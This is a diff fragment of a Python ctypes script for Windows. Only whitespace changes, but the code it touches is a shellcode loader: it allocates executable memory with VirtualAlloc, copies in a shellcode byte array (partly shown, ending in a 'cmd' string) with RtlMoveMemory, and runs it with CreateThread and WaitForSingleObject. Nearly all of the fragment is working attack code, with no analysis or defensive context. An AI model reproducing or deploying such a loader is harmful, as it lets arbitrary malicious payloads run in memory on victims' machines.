@@ -25,21 +25,21 @@ shellcode += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x00"
 shellcode = bytearray(shellcode)
 
 ptr = windll.kernel32.VirtualAlloc(c_int(0),
-                                          c_int(len(shellcode)),
-                                          c_int(0x3000),
-                                          c_int(0x40))
+                                   c_int(len(shellcode)),
+                                   c_int(0x3000),
+                                   c_int(0x40))
  
 buf = (c_char * len(shellcode)).from_buffer(shellcode)
  
 windll.kernel32.RtlMoveMemory(c_int(ptr),
-                                     buf,
-                                     c_int(len(shellcode)))
+                              buf,
+                              c_int(len(shellcode)))
  
 ht = windll.kernel32.CreateThread(c_int(0),
-                                         c_int(0),
-                                         c_int(ptr),
-                                         c_int(0),
-                                         c_int(0),
-                                         pointer(c_int(0)))
+                                  c_int(0),
+                                  c_int(ptr),
+                                  c_int(0),
+                                  c_int(0),
+                                  pointer(c_int(0)))
  
 windll.kernel32.WaitForSingleObject(c_int(ht),c_int(-1))
